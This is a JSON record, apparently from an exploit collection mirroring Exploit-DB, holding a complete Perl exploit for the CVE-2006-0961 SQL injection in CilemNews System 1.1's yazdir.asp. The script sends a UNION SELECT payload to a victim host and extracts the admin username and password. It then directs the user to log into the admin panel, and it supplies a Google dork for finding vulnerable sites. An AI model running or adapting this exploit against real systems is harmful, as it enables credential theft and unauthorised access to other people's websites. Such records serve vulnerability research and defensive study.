{
  "id": "1562",
  "title": "CilemNews System 1.1 - &#039;yazdir.asp&#039; haber_id SQL Injection",
  "cve": "CVE-2006-0961",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Usage: cilem.pl <victim> <directory>\r\n#Original Advisory: http://www.nukedx.com/?viewdoc=10\r\n#googledork [ inurl:yazdir.asp?haber_id= ] 2.140 pages...\r\nuse IO::Socket;\r\nif(@ARGV < 2){\r\nprint \"\r\n+***********************************************************************+\r\n+Welcome to CilemNews System <= 1.1 (yazdir.asp haber_id) SQL-inject xpl+\r\n+                   Usage: cilem.pl <victim> <directory>                +\r\n+                       Example: cilem.pl sux.com /                     +\r\n+                 googledork [ inurl:yazdir.asp?haber_id= ]             +\r\n+                 Method found & Exploit scripted by nukedx             +\r\n+***********************************************************************+\r\n\";\r\nexit();\r\n}\r\n#Local variables\r\n$cilemserver = $ARGV[0];\r\n$cilemserver =~ s/(http:\\/\\/)//eg;\r\n$cilemhost = \"http://\".$cilemserver;\r\n$port = \"80\";\r\n$cilemdir = $ARGV[1];\r\n$cilemtar = \"yazdir.asp?haber_id=\";\r\n$cilemfinal = \"admin/giris.asp\";\r\n$cilemxp = \"1%20union%20select%200,admin,sifre,0,0,0,0,0,0,0,0,0,0,0%20from%20ayarlar%20where%20admin=admin\";\r\n$cilemreq = $cilemhost.$cilemdir.$cilemtar.$cilemxp;\r\n#Writing data to socket\r\nprint \"+**********************************************************************+\\n\";\r\nprint \"+ Trying to connect: $cilemserver\\n\";\r\n$cilem = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$cilemserver\", PeerPort => \"$port\") || die \"\\n+ Connection failed...\\n\";\r\nprint $cilem \"GET $cilemreq\\n\";\r\nprint $cilem \"Host: $cilemserver\\n\";\r\nprint $cilem \"Accept: */*\\n\";\r\nprint $cilem \"Connection: close\\n\\n\";\r\nprint \"+ Connected!...\\n\";\r\nwhile($answer = <$cilem>) {\r\nif ($answer =~ /font-weight:700\\\">(.*?)<\\/b><\\/td>/){ \r\nprint \"+ Exploit succeed! Getting admin's information.\\n\";\r\nprint \"+ ---------------- +\\n\";\r\nprint \"+ USERNAME: $1\\n\";\r\n}\r\nif ($answer =~ /(.*?)<\\/font><\\/td>/) { \r\nprint \"+ PASSWORD: $1\\n\";\r\nprint \"+ ---------------- +\\n\";\r\nprint \"+ Lets go $cilemhost$cilemdir$cilemfinal and\\n+ Login with this information. \\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\nif ($answer =~ /Internal Server Error/) {\r\nprint \"+ This version of CilemNews is vulnerable too but default query of SQL-inject doesnt work on it\\n\";\r\nprint \"+ So please edit query by manually adding or removing null datas..\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\nif ($answer =~ /number of columns/) { \r\nprint \"+ This version of CilemNews is vulnerable too but default query of SQL-inject doesnt work on it\\n\";\r\nprint \"+ So please edit query by manually adding or removing null datas..\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\n}\r\nprint \"+ Exploit failed :(\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\n\r\n# milw0rm.com [2006-03-07]",
  "url": "https://www.exploit-db.com/exploits/1562"
}